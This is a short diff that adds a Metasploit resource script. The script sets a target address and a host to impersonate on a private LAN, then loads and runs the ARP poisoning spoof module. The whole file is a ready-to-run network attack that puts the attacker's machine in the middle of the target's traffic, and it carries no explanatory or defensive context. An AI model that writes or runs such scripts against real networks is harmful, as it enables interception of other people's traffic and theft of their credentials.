@@ -1,0 +1,9 @@
+<ruby>
+TARGET=192.168.0.11
+TOSPOOF=192.168.0.154
+
+run_single("use auxiliary/spoof/arp/arp_poisoning")
+run_single("set SHOSTS #{TOSPOOF}")
+run_single("set DHOSTS #{TARGET}")
+run_single("run")
+</ruby>
